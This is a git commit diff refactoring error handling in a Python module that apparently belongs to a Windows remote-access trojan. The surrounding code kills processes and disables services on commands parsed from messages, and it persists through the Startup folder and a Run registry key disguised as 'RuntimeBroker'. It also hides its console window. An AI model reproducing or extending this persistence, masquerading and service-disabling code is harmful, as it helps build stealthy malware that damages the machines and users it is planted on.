9e23cc3843bce5cbff36032719a59c6fbe34b738
cac2107 <cac2106@rit.edu>
2023-11-18 16:02:07 -0500

    Refactored error handling

--- pyutils/local_utils.py
+++ pyutils/local_utils.py
@@ -3,24 +3,22 @@ import subprocess
 import win32console
 import win32gui
 import psutil
+import threading
 from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx
 
 def kill_process_cmd(message):
     try:
         pid = message.split(" ")[1]
         return kill_process(pid)
-    except Exception as e:
-        return f"Error: {e}"
+    except Exception as e: return f"Error in kill_process_cmd(): {e}"
     
 def kill_process(pid):
     try:
         pid = str(pid)
         subprocess.run(['taskkill', '/F', '/PID', pid], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         return f"Succesfully killed process: {pid}"
-    except subprocess.CalledProcessError as e:
-        return f"Called Process Error: {e}"
-    except Exception as e:
-        return f"Error: {e}"
+    except subprocess.CalledProcessError as e: return f"Called Process Error in kill_process(): {e}"
+    except Exception as e: return f"Error in kill_process(): {e}"
     
 def get_all_pids_by_name(name):
     try:
@@ -30,16 +28,14 @@ def get_all_pids_by_name(name):
             if name in proc.info['name'].lower():
                 pids.append(proc.info['pid'])
         return pids
-    except Exception:
-        return None
+    except Exception: return None
     
 def kill_all_processes_by_name(message):
     try:
         name = message.split(" ")[1]
         pids = get_all_pids_by_name(name)
         for pid in pids: kill_process(pid)
-    except Exception as e:
-        return f"Error: {e}"
+    except Exception as e: return f"Error in kill by name: {e}"
 
 def processes(message):
     try:
@@ -49,7 +45,7 @@ def processes(message):
         for proc in psutil.process_iter(['pid', 'name']):
             if not params or (params and split[1].lower() in proc.info['name'].lower()):
                 finalstr += f"PID: {proc.info['pid']}, Name: {proc.info['name']}\n"
-    except Exception as e: return e
+    except Exception as e: return f"Error in processes(): {e}"
     return finalstr
 
 def get_all_services():
@@ -61,16 +57,14 @@ def stop_service(service_name):
         subprocess.run(['sc', 'config', service_name, "start=", "disabled"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         subprocess.run(['sc', 'stop', service_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         return f"Succesfully stopped service: {service_name}"
-    except subprocess.CalledProcessError as e:
-        return f"Called Process Error: {e}"
-    except Exception as e:
-        return f"Error: {e}"
+    except subprocess.CalledProcessError as e: return f"Called Process Error in stop_service(): {e}"
+    except Exception as e: return f"Error in stop_service(): {e}"
     
 def stop_service_cmd(message):
     try:
         service_name = message.split(" ")[1]
         return stop_service(service_name)
-    except Exception as e: return f"Error: {e}"
+    except Exception as e: return f"Error in stop_service_cmd(): {e}"
 
 def get_all_services_cmd(message):
     try:
@@ -83,23 +77,24 @@ def get_all_services_cmd(message):
             if (running and s.status() == "running") or not running:
                 final += f"Name: {s.name()}, DisplayName: {s.display_name()}, Status: {s.status()}\n"
         return final
-    except Exception as e:
-        return f"Error: {e}"
+    except Exception as e: return f"Error in get_all_services_cmd(): {e}"
 
 def add_to_startup_1():
     try:
         shutil.copy(__file__, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
         return "Add to startup folder Success"
-    except Exception as e: return f"Error: {e}"
+    except Exception as e: return f"Error in add_to_startup_1(): {e}"
 
 def add_to_startup_2():
     try:
         key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
         SetValueEx(key2change, "RuntimeBroker", 0, REG_SZ, __file__)
-    except Exception as e: return f"Error occured: {e}"
+    except Exception as e: return f"Error occured in add_to_startup_2(): {e}"
     return "Successfully added startup regkey"
 
 def hide():
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window, 0)
+    try:
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window, 0)
+    except: pass
